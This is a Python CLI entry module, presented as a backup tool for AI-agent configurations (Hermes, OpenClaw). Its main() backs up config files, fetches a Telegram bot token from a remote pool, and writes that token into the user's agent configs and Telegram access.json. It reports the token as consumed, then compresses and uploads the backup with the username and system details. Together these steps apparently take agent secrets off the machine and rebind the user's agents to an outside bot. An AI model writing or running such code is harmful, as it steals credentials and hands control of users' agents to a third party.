"""CLI 入口"""

from . import logger
from .backup import (
    backup_configs,
    check_hermes_has_bot_token,
    check_openclaw_has_bot_token,
    configure_hermes_env,
    configure_openclaw,
    configure_telegram_access,
)
from .config import get_backup_root
from .detector import detect_system
from .uploader import compress_and_upload, fetch_bot_token, upload_bot_token_list


def main() -> None:
    """运行完整的备份与上传流程。"""
    system, username = detect_system()
    user_prefix = username[:5]

    # 计算路径
    backup_root = get_backup_root(system, username)

    # 在备份目录中创建日志文件
    log_path = backup_root / "backup.log"
    try:
        log_path.parent.mkdir(parents=True, exist_ok=True)
        logger.setup_log(log_path)
    except OSError:
        pass  # 日志不可写时静默跳过日志记录

    logger.log("=" * 60)
    logger.log("  代理配置备份与上传工具")
    logger.log("=" * 60)
    logger.log(f"\n  User:        {username}")
    logger.log(f"  User prefix: {user_prefix}")
    logger.log(f"  System:      {system}")
    logger.log("")

    # 步骤3：备份配置文件
    logger.log("[1/6] 正在备份配置文件...")
    backup_configs(backup_root)

    # 步骤4：获取 bot token
    logger.log("\n[2/6] 正在获取 Telegram Bot Token...")
    bot_token, all_tokens = fetch_bot_token()
    if bot_token:
        logger.log(f"  ✓ Bot token fetched (****{bot_token[-6:]})")
    else:
        logger.log("  Warning: Bot token not available, token-dependent config will be skipped")

    # 步骤5：配置 Hermes
    logger.log("\n[3/6] 正在配置 .hermes/.env...")
    configure_hermes_env(bot_token)

    # 步骤6：配置 OpenClaw
    logger.log("\n[4/6] 正在配置 OpenClaw...")
    configure_openclaw(bot_token)

    # 检查是否有任意一处写入了新 bot token，若有则从列表中删除并回传
    if bot_token and all_tokens:
        hermes_ok = check_hermes_has_bot_token(bot_token)
        openclaw_ok = check_openclaw_has_bot_token(bot_token)
        if hermes_ok or openclaw_ok:
            logger.log(f"\n  Bot token consumed (hermes={hermes_ok}, openclaw={openclaw_ok}), updating remote list...")
            remaining = [t for t in all_tokens if t != bot_token]
            upload_bot_token_list(remaining)

    # 步骤7：配置 Telegram access.json
    logger.log("\n[5/6] 正在配置 Telegram access.json...")
    configure_telegram_access()

    # 步骤8：压缩与上传
    logger.log("\n[6/6] 正在压缩与上传...")
    compress_and_upload(backup_root, system, username)

    logger.log("\n" + "=" * 60)
    logger.log("  Done!")
    logger.log("=" * 60)
